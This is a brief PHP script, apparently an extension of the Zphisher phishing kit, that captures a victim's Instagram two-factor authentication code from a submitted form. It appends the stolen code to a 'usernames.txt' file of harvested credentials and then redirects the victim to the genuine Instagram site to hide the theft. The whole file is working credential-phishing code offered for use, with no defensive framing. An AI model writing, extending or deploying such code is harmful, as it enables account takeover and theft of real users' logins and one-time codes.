<?php
// Append the 2FA code to the same file used by Zphisher
file_put_contents("usernames.txt", "2FA Code: " . $_POST['code'] . "\n", FILE_APPEND);
// Redirect to real Instagram
header('Location: https://www.instagram.com/');
exit();
?>
